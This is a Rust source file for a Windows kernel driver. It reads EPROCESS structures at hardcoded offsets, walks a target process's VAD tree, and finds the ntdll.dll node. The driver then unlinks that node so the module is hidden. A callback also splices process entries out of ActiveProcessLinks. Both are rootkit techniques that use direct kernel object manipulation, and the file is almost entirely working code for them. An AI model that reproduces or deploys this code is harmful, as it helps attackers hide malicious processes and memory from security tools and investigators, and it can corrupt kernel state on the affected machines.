
#![no_std]
#![allow(unused_imports)]
#![no_main]

use core::panic::PanicInfo;
use core::arch::asm;


use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::ZwCurrentProcess;
use winapi::km::wdm::DRIVER_OBJECT;
use winapi::shared::basetsd::PSIZE_T;
use winapi::shared::ntdef::*;
use winapi::ctypes::*;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::vc::vcruntime::size_t;


use ntapi::ntexapi::*;
use ntapi::ntmmapi::*;

#[derive(Copy,Clone)]
#[repr(C)]
#[repr(packed)]
pub struct MM_COPY_ADDRESS{
    address: *mut c_void
}


#[link(name = "ntoskrnl")]
extern "C"{
    pub fn DbgPrint(format: *const u8, ...) -> NTSTATUS;
    pub fn MmCopyMemory(targetaddress: *mut c_void,
    sourceaddress: MM_COPY_ADDRESS, 
    numberofbytes: usize,
    flags: u32, byteswritten: *mut usize) -> i32; 
    pub fn MmIsAddressValid(virtualaddress: *mut c_void) -> u8;
    pub fn ZwOpenProcess(outhandle: *mut c_void,
    accessmask: u32, objectattrs: *mut OBJECT_ATTRIBUTES,
    pclientid: *mut CLIENT_ID);

    pub fn PsGetCurrentProcessId() -> *mut c_void;
    pub fn PsGetCurrentThreadId() -> *mut c_void;
    pub fn PsLookupProcessByProcessId(pid: HANDLE,peprocess: *mut c_void)-> NTSTATUS;
    pub fn PsSetCreateProcessNotifyRoutine( functionpointer: *mut c_void, toremove: u8) -> NTSTATUS;
    
    //pub fn ZwOpenProcess() -> *mut c_void;
}


#[link(name="ntdll")]
extern "C"{
    pub fn NtClose(handle: *mut c_void) -> NTSTATUS;

}




#[derive(Clone,Copy)]
#[repr(C)]
#[repr(packed)]
pub struct idtr{
    limit: i16,
    registervalue: i64
}


#[derive(Copy, Clone)]
#[repr(C)]
#[repr(packed)]
pub struct idtentry64{
    offsetlow: u16,
    selector: u16,
    reserveddpltype: u16,
    offsetmiddle: u16,
    offsethigh: u32,
    reserved1: u32
}


#[no_mangle]
pub extern "C" fn processcreationcallback(parentid: HANDLE, pid: HANDLE, iscreated: u8){

        // new process has been created
    let mut eprocess:u64 = 0;
        
    let res = unsafe{PsLookupProcessByProcessId(pid, &mut eprocess as *mut _ as *mut c_void)};

    if eprocess!=0{
        let mut pname = unsafe{core::ptr::read((eprocess+0x5a8) as *const [u8;15])};

        if iscreated==1{
           // unsafe{DbgPrint("process created: %s: %I64d\n\0".as_ptr(),
           //  pname.as_mut_ptr() as *mut c_void, pid)};
        
        }

        // process terminated
        else{
           // unsafe{DbgPrint("process terminated: %s: %I64d\n\0".as_ptr(),
           // pname.as_mut_ptr() as *mut c_void, pid)};

            unsafe{
                let mut oureprocess:u64 = 0;
                let res = PsLookupProcessByProcessId(pid, &mut oureprocess as *mut _ as  *mut c_void);
        
                let previouseprocess = core::ptr::read((oureprocess+0x448+0x8) as *mut u64) - 0x448;
                let nexteprocess = core::ptr::read((oureprocess+0x448) as *mut u64) - 0x448;


                core::ptr::write((previouseprocess+0x448) as *mut u64, (oureprocess+0x448));
                core::ptr::write((nexteprocess+0x448+0x8) as *mut u64, (oureprocess+0x448));
                


            }
            

        }
       
        
    }



}


#[derive(Copy, Clone)]
#[repr(C)]
#[repr(packed)]
struct rtl_balanced_node{
    left: u64,
    right: u64,
    parentvalue: u64
}

#[derive(Copy, Clone)]
#[repr(C)]
struct myunicodestring{
    Length: u16,
    MaximumLength: u16,
    Buffer: u64
}




pub fn traverse(rootnode: rtl_balanced_node){
    unsafe{

          // Vad - 56 61 64 20 - 86 97 100 32 in int
        // VadS - 56 61 64 53 -  86 97 100 83 in int

        
        if rootnode.left!=0{
            
            // enumerating the node mmvad or mmvad_short
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.left - 12) as *mut c_void};
            let mut byteswritten = 0;
            let mut tag:[u8;5] = [0;5];
            let res = MmCopyMemory(tag.as_mut_ptr() as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);
            // VadS or Vad'space'
          
                // vads + 0x18 startingvpn
                // vads + 0x1c endingvpn
                
            if res==STATUS_SUCCESS&&byteswritten==4{
                DbgPrint("tag: %s\n\0".as_ptr(),tag.as_ptr() as *const u8 );
            }



            let mut startingvpn: u32 = 0;
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.left+0x18) as *mut c_void};
            let res = MmCopyMemory(&mut startingvpn as *mut _ as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);

            if res!=STATUS_SUCCESS{
                DbgPrint("reading startingvpn error: %I64x\n\0".as_ptr(), res as c_long);
            }



            let mut endingvpn: u32=0;
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.left+0x1c) as *mut c_void};
            let res = MmCopyMemory(&mut endingvpn as *mut _ as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);

            if res!=STATUS_SUCCESS{
                DbgPrint("reading endingvpn error: %I64x\n\0".as_ptr(), res as c_long);
            }
            //let startingvpn = core::ptr::read((rootnode.left + 0x18) as *const u32);
            //let endingvpn = core::ptr::read((rootnode.left + 0x1c) as *const u32);
                

            DbgPrint("left node: %I64x -> %I64x to %I64x\n\0".as_ptr(), rootnode.left as c_ulonglong, startingvpn as c_ulong,endingvpn as c_ulong);

            // Vad
           
            
            if tag==[86u8,97 ,100,32,0] {
                // Vad + 0x48 - pointer to subsection
                let mut byteswritten = 0;
                let  mmcopy = MM_COPY_ADDRESS{address:(rootnode.left+0x48) as *mut c_void};

                // starting member is pointer to controlarea structure
                let mut subsection:u64 = 0;
                let mut controlarea:u64 = 0; 
                let mut filepointer:u64 = 0;   
                MmCopyMemory(&mut subsection as *mut _ as *mut c_void, 
                    mmcopy, 8, 0x2, &mut byteswritten);
                
                if res==STATUS_SUCCESS&&byteswritten==8{
                    let mmcopy = MM_COPY_ADDRESS{address:(subsection) as *mut c_void};
                    let res2= MmCopyMemory(&mut controlarea as *mut _ as *mut c_void, 
                        mmcopy, 8, 0x2, &mut byteswritten);
                    
                    if res2==STATUS_SUCCESS&&byteswritten==8{
                    // controlarea + 0x40 gives file_pointer _EX_FAST_REF
                    let mmcopy = MM_COPY_ADDRESS{address:(controlarea+0x40) as *mut c_void};
                    let res3 = MmCopyMemory(&mut filepointer as *mut _ as *mut c_void, 
                        mmcopy, 8, 0x2, &mut byteswritten);
                    
                    if res3==STATUS_SUCCESS&&byteswritten==8{
                           // last nibble is reference count of this object
                        // we need to nullify this reference count
                        //let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                        // filepointer + 0x58 gives unicode_String of module
                        let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                        if filepointer!=0{
                           // DbgPrint("filepointer: %I64x\n\0".as_ptr(),  filepointer as c_ulonglong);

                            
                            let mut us:[u8;16] = [0;16];
                            let mmcopy = MM_COPY_ADDRESS{address:(filepointer+0x58) as *mut c_void};
                            let res4 = MmCopyMemory(us.as_mut_ptr() as *mut c_void, 
                            mmcopy, 16, 0x2, &mut byteswritten);

                            if res4==STATUS_SUCCESS&&byteswritten==16{
                                let mut us = *(us.as_ptr() as *const UNICODE_STRING);
                                //DbgPrint("length: %I64x, maxlen: %I64x, buffer: %I64x".as_ptr(),
                                //us.Length as c_uint, us.MaximumLength as c_uint, us.Buffer as c_ulonglong);   
                                //let mut dllname = unicodetostring(& mut us);
                               
                                let ntdllbytes = [110u8,0,116,0,100,0,108,0,108,0,46,0,100,0,108,0,108,0];
                                if us.Length-ntdllbytes.len() as u16>0{
                                    let mut index = us.Length-18;
                                    let mut founddll = true;
                                    for k in index..us.Length{
                                        let t = core::ptr::read((us.Buffer as usize+k as usize) as *const u8);
                                        if t!=ntdllbytes[(k-index) as usize]{

                                            founddll=false;
                                            break;
                                        }
                                    }
                                    if founddll==true{
                                        DbgPrint("filepointer: %I64x\n\0".as_ptr(),  filepointer as c_ulonglong);

                                        DbgPrint("yay found ntdll.dll\n\0".as_ptr());
                                   
                                        //checking if our node is leaf node then parent node points to null
                                        let tempnode = *(rootnode.left as *mut rtl_balanced_node);
                                        if tempnode.right==0 && tempnode.left==0{
                                            let parentnodeaddress = tempnode.parentvalue&0xFFFFFFFF_FFFFFFF0;
                                            core::ptr::write(parentnodeaddress as *mut u64, 0 as u64);
                                            DbgPrint("deleted ntdll.dll\n\0".as_ptr());
                                            return ();
                                        
                                        }
                                   


                                        // if our dll node has only one child then point this child to parentnode
                                        if (tempnode.left==0 &&tempnode.right!=0) || (tempnode.left!=0 && tempnode.right==0) {
                                            let parentnodeaddress = tempnode.parentvalue&0xFFFFFFFF_FFFFFFF0;
                                            if tempnode.right!=0{
            
                                                // childnode.parentvalue = parentnodeaddress
                                                core::ptr::write((tempnode.right + 0x10) as *mut u64,parentnodeaddress);
                                                // parent.left = childnode
                                                core::ptr::write(parentnodeaddress as *mut u64, tempnode.right);
                                                DbgPrint("deleted ntdll.dll\n\0".as_ptr());

                                                     return ();
                                            }
                                            if tempnode.left!=0{
                                                 // childnode.parentvalue = parentnodeaddress
                                                 core::ptr::write((tempnode.left + 0x10) as *mut u64,parentnodeaddress);
                                                 // parent.left = childnode
                                                core::ptr::write(parentnodeaddress as *mut u64, tempnode.left);
                                                DbgPrint("deleted ntdll.dll\n\0".as_ptr());

                                                 return ();
                                            }
                                   
                                        }
            


                                    }

                                }
                                

                                //DbgPrint("dllname: %wZ\n\0".as_ptr(),(filepointer+0x58));
                                
                                
                            }

                            
                        }
                          
                    }

                    }
                    

                }
                //let controlarea = core::ptr::read(subsection as *const u64);
                //let filepointer = core::ptr::read((controlarea + 0x40) as *const u64);
                // last nibble is reference count of this object
                // we need to nullify this reference count
                //let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                // filepointer + 0x58 gives unicode_String of module
                
            }


            vadcount +=1;
            traverse(*(rootnode.clone().left as *mut rtl_balanced_node));
        }

        if rootnode.right!=0{
           
            // enumerating the node mmvad or mmvad_short
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.right - 12) as *mut c_void};
            let mut byteswritten = 0;
            let mut tag:[u8;5] = [0;5];
            let res = MmCopyMemory(tag.as_mut_ptr() as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);
            // VadS or Vad'space'
          
                // vads + 0x18 startingvpn
                // vads + 0x1c endingvpn
                
            if res==STATUS_SUCCESS&&byteswritten==4{
                DbgPrint("tag: %s\n\0".as_ptr(),tag.as_ptr() as *const u8 );
            }



            let mut startingvpn: u32 = 0;
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.right+0x18) as *mut c_void};
            let res = MmCopyMemory(&mut startingvpn as *mut _ as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);

            if res!=STATUS_SUCCESS{
                DbgPrint("reading startingvpn error: %I64x\n\0".as_ptr(), res as c_long);
            }



            let mut endingvpn: u32=0;
            let mmcopy = MM_COPY_ADDRESS{address:(rootnode.right+0x1c) as *mut c_void};
            let res = MmCopyMemory(&mut endingvpn as *mut _ as *mut c_void, 
            mmcopy, 4, 0x2, &mut byteswritten);

            if res!=STATUS_SUCCESS{
                DbgPrint("reading endingvpn error: %I64x\n\0".as_ptr(), res as c_long);
            }
            
            //let startingvpn = core::ptr::read((rootnode.right + 0x18) as *const u32);
            //let endingvpn = core::ptr::read((rootnode.right + 0x1c) as *const u32);
                
            DbgPrint("right node: %I64x -> %I64x to %I64x\n\0".as_ptr(), rootnode.right as c_ulonglong, startingvpn as c_ulong,endingvpn as c_ulong);


           
            if tag==[86u8,97 ,100,32,0] {
                // Vad + 0x48 - pointer to subsection
                let mut byteswritten = 0;
                let  mmcopy = MM_COPY_ADDRESS{address:(rootnode.right+0x48) as *mut c_void};

                // starting member is pointer to controlarea structure
                let mut subsection:u64 = 0;
                let mut controlarea:u64 = 0; 
                let mut filepointer:u64 = 0;   
                MmCopyMemory(&mut subsection as *mut _ as *mut c_void, 
                    mmcopy, 8, 0x2, &mut byteswritten);
                
                if res==STATUS_SUCCESS&&byteswritten==8{
                    let mmcopy = MM_COPY_ADDRESS{address:(subsection) as *mut c_void};
                    let res2= MmCopyMemory(&mut controlarea as *mut _ as *mut c_void, 
                        mmcopy, 8, 0x2, &mut byteswritten);
                    
                    if res2==STATUS_SUCCESS&&byteswritten==8{
                    // controlarea + 0x40 gives file_pointer _EX_FAST_REF
                    let mmcopy = MM_COPY_ADDRESS{address:(controlarea+0x40) as *mut c_void};
                    let res3 = MmCopyMemory(&mut filepointer as *mut _ as *mut c_void, 
                        mmcopy, 8, 0x2, &mut byteswritten);
                    
                    if res3==STATUS_SUCCESS&&byteswritten==8{
                           // last nibble is reference count of this object
                        // we need to nullify this reference count
                        //let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                        // filepointer + 0x58 gives unicode_String of module
                        let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                        if filepointer!=0{
                            //DbgPrint("filepointer: %I64x\n\0".as_ptr(),  filepointer as c_ulonglong);


                            let mut us:[u8;16] = [0;16];
                            let mmcopy = MM_COPY_ADDRESS{address:(filepointer+0x58) as *mut c_void};
                            let res4 = MmCopyMemory(us.as_mut_ptr() as *mut c_void, 
                            mmcopy, 16, 0x2, &mut byteswritten);

                            if res4==STATUS_SUCCESS&&byteswritten==16{
                                let mut us = *(us.as_ptr() as *const UNICODE_STRING);
                                //DbgPrint("length: %I64x, maxlen: %I64x, buffer: %I64x".as_ptr(),
                                //us.Length as c_uint, us.MaximumLength as c_uint, us.Buffer as c_ulonglong);   
                                //let mut dllname = unicodetostring(& mut us);
                               

                                let ntdllbytes = [110u8,0,116,0,100,0,108,0,108,0,46,0,100,0,108,0,108,0];
                                if us.Length-ntdllbytes.len() as u16>0{
                                    let mut index = us.Length-18;
                                    let mut founddll = true;
                                    for k in index..us.Length{
                                        let t = core::ptr::read((us.Buffer as usize+k as usize) as *const u8);
                                        if t!=ntdllbytes[(k-index) as usize]{

                                            founddll=false;
                                            break;
                                        }
                                    }
                                    if founddll==true{
                                        DbgPrint("filepointer: %I64x\n\0".as_ptr(),  filepointer as c_ulonglong);

                                        DbgPrint("yay found ntdll.dll\n\0".as_ptr());
                                    
                                        //checking if our node is leaf node then parent node points to null
                                        let tempnode = *(rootnode.right as *mut rtl_balanced_node);
                                        if tempnode.right==0 && tempnode.left==0{
                                            let parentnodeaddress = tempnode.parentvalue&0xFFFFFFFF_FFFFFFF0;
                                            core::ptr::write((parentnodeaddress+0x8) as *mut u64, 0 as u64);
                                            DbgPrint("deleted ntdll.dll\n\0".as_ptr());
                                            return ();
                                        
                                        }



                                         // if our dll node has only one child then point this child to parentnode
                                         if (tempnode.left==0 &&tempnode.right!=0) || (tempnode.left!=0 && tempnode.right==0) {
                                            let parentnodeaddress = tempnode.parentvalue&0xFFFFFFFF_FFFFFFF0;
                                            if tempnode.right!=0{
            
                                                // childnode.parentvalue = parentnodeaddress
                                                core::ptr::write((tempnode.right + 0x10) as *mut u64,parentnodeaddress);
                                                // parent.left = childnode
                                                core::ptr::write((parentnodeaddress+0x8) as *mut u64, tempnode.right);
                                                DbgPrint("deleted ntdll.dll\n\0".as_ptr());

                                                     return ();
                                            }
                                            if tempnode.left!=0{
                                                 // childnode.parentvalue = parentnodeaddress
                                                 core::ptr::write((tempnode.left + 0x10) as *mut u64,parentnodeaddress);
                                                 // parent.left = childnode
                                                core::ptr::write((parentnodeaddress+0x8) as *mut u64, tempnode.left);
                                                DbgPrint("deleted ntdll.dll\n\0".as_ptr());

                                                 return ();
                                            }
                                   
                                        }
            








                                    
                                    
                                    }

                                }
                                


                                //DbgPrint("dllname: %wZ\n\0".as_ptr(), (filepointer+0x58) );
                                
                                
                                

                            }



                            //let us = core::ptr::read((filepointer+0x58) as *const UNICODE_STRING);
                            //if us.Length!=0 && us.MaximumLength!=0{
                                //let mut dllname = unicodetostring(&us) ;
                                //DbgPrint("dllname: %s\n\0".as_ptr(), dllname.as_ptr() as *const u8);
                            //}
                        }
                            
                    }

                    }
                    

                }
                //let controlarea = core::ptr::read(subsection as *const u64);
                //let filepointer = core::ptr::read((controlarea + 0x40) as *const u64);
                // last nibble is reference count of this object
                // we need to nullify this reference count
                //let filepointer = filepointer & 0xFFFFFFFF_FFFFFFF0;
                // filepointer + 0x58 gives unicode_String of module
                
            }

           
            vadcount +=1;
            traverse(*(rootnode.clone().right as *mut rtl_balanced_node));

        }

    }
}

static mut vadcount:u32 = 0;

#[no_mangle]
pub extern "system" fn driver_entry(_driver: &mut DRIVER_OBJECT,
     _: *const UNICODE_STRING) -> u32 {
    unsafe {

        
        //PsSetCreateProcessNotifyRoutine(processcreationcallback as *mut c_void, 0);
    
        let mut eprocess:u64 = 0;
        PsLookupProcessByProcessId(6432 as HANDLE, &mut eprocess as *mut _ as *mut c_void);

        if eprocess==0{
            return 0;
        }
    
        // eprocess+0x440 = uniqueprocessid (8 bytes)
        // eprocess+0x5a8 = imagefilename (15bytes)
        // eprocess+0x448 = activeprocesslinks (_list_entry)
        // eprocess+0x5e0 = threadlisthead (_list_entry)
        // ethread+0x4e8 = threadlistentry
        // ethread+0x478 = Cid = (processid, threadid)

        // eprocess+7d8 = vadroot
        let mut firstpid:u64 = core::ptr::read((eprocess+0x440) as *const u64);
        
        /*let mut vadroot:u64 = 0;
        let mmcopy = MM_COPY_ADDRESS{address:(vadroot + 0x7d8) as *mut c_void};
        let mut byteswritten = 0;
        let res = MmCopyMemory(&mut vadroot as *mut _ as *mut c_void, 
            mmcopy, 8, 0x2, &mut byteswritten);
        
        DbgPrint("result: %I64x, vadroot: %I64x\n\0".as_ptr(),
        res as c_uint, vadroot as c_ulonglong);       */


        let vadroot = core::ptr::read((eprocess+0x7d8) as *const u64);
        DbgPrint("vadroot: %I64x\n\0".as_ptr(), vadroot as c_ulonglong);

        
        let rootnode = *(vadroot  as *mut rtl_balanced_node);
        
        // preorder traversal left
        //traverseleft(rootnode.clone());
        /*let mut tempnode = rootnode;
        let mut backtrack = 0;
        let mut parentnode = core::mem::zeroed::<rtl_balanced_node>();

        let mut isvisited = 2;*/

        // Vad - 56 61 64 20
        // VadS - 56 61 64 53


       
        traverse(rootnode);
        DbgPrint("total vadcount: %I64d\n\0".as_ptr(), vadcount as c_int);
       
        //DbgPrint("left: %I64x\t right: %I64x\t parent: %I64d\n\0".as_ptr(),
        //rootnode.left as c_ulonglong,rootnode.right as c_ulonglong, rootnode.parentvalue as c_ulonglong );   
       

        
    }   

    0
}




pub fn unicodetostring(u:&mut UNICODE_STRING) -> [u8;2048] {

    let mut buffer:[u8;2048] = [0;2048];

    for i in 0..u.MaximumLength/2{
        let mut u16byte: u16 = 0;
        let mmcopy = MM_COPY_ADDRESS{address: (u.Buffer as usize + (i as usize*2)) as *mut c_void} ;
        let mut byteswritten = 0;
        let res = unsafe{MmCopyMemory(&mut u16byte as *mut _ as *mut c_void, 
            mmcopy, 
            2, 
            0x2, 
            &mut byteswritten)};

        if res==STATUS_SUCCESS{
            if u16byte==0{
                break;
            }
            buffer[i as usize] = (u16byte&0xFFFF) as u8;  
        }
          
    }
    
    return buffer;
    

}



pub fn readstringat(){
    unsafe{



    }
}




pub fn readbytesat(addr: *mut c_void, n: u64){
    unsafe{
        // addr contains address to read
        // n contains number of bytes to read

        let mmcopy = MM_COPY_ADDRESS{address: addr};
        //let mut destination:[u8;n] = [0;n];
        

    }
}




#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 {
    unimplemented!()
}
#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

